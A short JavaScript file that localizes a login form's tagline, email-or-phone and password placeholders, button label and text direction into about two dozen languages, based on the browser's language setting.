transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
	ar: {
		dir: 'rtl',
		main: 'تواصل مع الأشخاص المفضلين لديك.',
		user: 'عنوان البريد الإلكتروني أو رقم الهاتف المحمول',
		pass: 'كلمه السر',
		button: 'تسجيل دخول'

	},
	es: {
		dir: 'ltr',
		main: 'Conéctese con sus personas favoritas.',
		user: 'Dirección de email o teléfono móvil',
		pass: 'contraseña',
		button: 'Iniciar sesión'
	},

    mn: {
		dir: 'ltr',
		main : 'Дуртай хүмүүстэйгээ холбогдоорой.' ,
		user :'Имэйл хаяг эсвэл гар утас' ,
		pass :'нууц үг' ,
		button : 'Нэвтрэх' 
	},

	am: {
		dir: 'rtl',
		main: 'ከሚወዷቸው ሰዎች ጋር ይገናኙ።',
		user: 'ኢሜል አድራሻ ወይም የሞባይል ቁጥር',
		pass: 'ፕስወርድ',
		button: 'ግባ'
	},
	bg: {
		dir: 'ltr',
		main: 'Свържете се с любимите си хора.',
		user: 'Имейл адрес или мобилен номер',
		pass: 'парола',
		button: 'Влизам'
	},
	bn: {
		dir: 'ltr',
		main: 'আপনার প্রিয় মানুষদের সাথে সংযোগ করুন৷',
		user: 'ইমেল ঠিকানা বা মোবাইল নম্বর',
		pass: 'পাসওয়ার্ড',
		button: 'প্রবেশ করুন'

	},
	cs: {
		dir: 'ltr',
		main: 'Spojte se se svými oblíbenými lidmi.',
		user: 'E-mailová adresa nebo mobilní číslo',
		pass: 'Heslo',
		button: 'Přihlásit se'

	},
	el: {
		dir: 'ltr',
		main: 'Συνδεθείτε με τα αγαπημένα σας άτομα.',
		user: 'Διεύθυνση email ή αριθμός κινητού τηλεφώνου',
		pass: 'Κωδικός πρόσβασης',
		button: 'Σύνδεση'

	},
	fi: {
		dir: 'ltr',
		main: 'Pidä yhteyttä suosikkiihmisiisi.',
		user: 'Sähköpostiosoite tai matkapuhelinnumero',
		pass: 'Salasana',
		button: 'Kirjaudu sisään'

	},
	fr: {
		dir: 'ltr',
		main: 'Connectez-vous avec vos personnes préférées.',
		user: 'Adresse e-mail ou numéro de portable',
		pass: 'le mot de passe',
		button: 'Connexion'
	},
	he: {
		dir: 'rtl',
		main: 'התחבר לאנשים האהובים עליך.',
		user: 'כתובת אימייל או מספר טלפון',
		pass: 'סיסמה',
		button: 'התחברות'

	},
	hi: {
		dir: 'ltr',
		main: 'अपने पसंदीदा लोगों से जुड़ें।',
		user: 'विद्युत डाक पता या मोबाइल नंबर',
		pass: 'पासवर्ड',
		button: 'लॉग इन करें'

	},
	hu: {
		dir: 'ltr',
		main: 'Lépjen kapcsolatba kedvenc embereivel.',
		user: 'E-mail cím vagy mobilszám',
		pass: 'Jelszó',
		button: 'Belépés'

	},
	id: {
		dir: 'ltr',
		main: 'Terhubung dengan orang-orang favorit Anda.',
		user: 'Alamat email atau nomor ponsel',
		pass: 'kata sandi',
		button: 'Gabung'

	},
	it: {
		dir: 'ltr',
		main: 'Connettiti con le tue persone preferite.',
		user: 'Indirizzo email o numero di cellulare',
		pass: "parola d'ordine",
		button: 'Accesso'

	},
	my: {
		dir: 'ltr',
		main: 'သင်အကြိုက်ဆုံးလူများနှင့် ချိတ်ဆက်ပါ။',
		user: 'အီးမေးလ်လိပ်စာ သို့မဟုတ် မိုဘိုင်းနံပါတ်',
		pass: 'စကားဝှက်',
		button: 'လော့ဂ်အင်'

	},
	ne: {
		dir: 'ltr',
		main: 'आफ्नो मनपर्ने व्यक्तिहरूसँग जडान गर्नुहोस्।',
		user: 'इमेल ठेगाना वा मोबाइल नम्बर',
		pass: 'पासवर्ड',
		button: 'लग - इन'

	},
	ph: {
		dir: 'ltr',
		main: 'Kumonekta sa iyong mga paboritong tao.',
		user: 'Email address o numero ng mobile',
		pass: 'password',
		button: 'Mag log in'

	},
	pl: {
		dir: 'ltr',
		main: 'Połącz się ze swoimi ulubionymi ludźmi.',
		user: 'Adres email czy numer telefonu',
		pass: 'hasło',
		button: 'Zaloguj sie'

	},
	pt: {
		dir: 'ltr',
		main: 'Conecte-se com suas pessoas favoritas.',
		user: 'Endereço de email ou número de celular',
		pass: 'senha',
		button: 'Conecte-se'
	},
	ro: {
		dir: 'ltr',
		main: 'Conectează-te cu oamenii tăi preferați.',
		user: 'Adresă de e-mail sau număr de telefon',
		pass: 'parola',
		button: 'Autentificare'
	},
	sw: {
		dir: 'ltr',
		main: 'Ungana na watu unaowapenda.',
		user: 'Anwani ya barua pepe au nambari ya simu',
		pass: 'nenosiri',
		button: 'Ingia'

	},
	th: {
		dir: 'ltr',
		main: 'เชื่อมต่อกับคนที่คุณชื่นชอบ',
		user: 'ที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือ',
		pass: 'รหัสผ่าน',
		button: 'เข้าสู่ระบบ'

	},
	tr: {
		dir: 'ltr',
		main: 'En sevdiğiniz kişilerle bağlantı kurun.',
		user: 'E-posta adresi veya cep telefonu numarası',
		pass: 'parola',
		button: 'Giriş yapmak'

	},
	ur: {
		dir: 'rtl',
		main: 'اپنے پسندیدہ لوگوں سے جڑیں۔',
		user: 'ای میل ایڈریس یا موبائل نمبر',
		pass: 'پاس ورڈ',
		button: 'لاگ ان کریں'

	},
	vi: {
		dir: 'ltr',
		main: 'Kết nối với những người bạn yêu thích.',
		user: 'Địa chỉ email hoặc số điện thoại di động',
		pass: 'mật khẩu mở khóa',
		button: 'Đăng nhập'

	}
};


transItems[0].style.direction = Translate[userLang].dir;
transItems[1].innerHTML = Translate[userLang].main;
transItems[2].setAttribute("placeholder", Translate[userLang].user);
transItems[3].setAttribute("placeholder", Translate[userLang].pass);
transItems[4].innerHTML = Translate[userLang].button;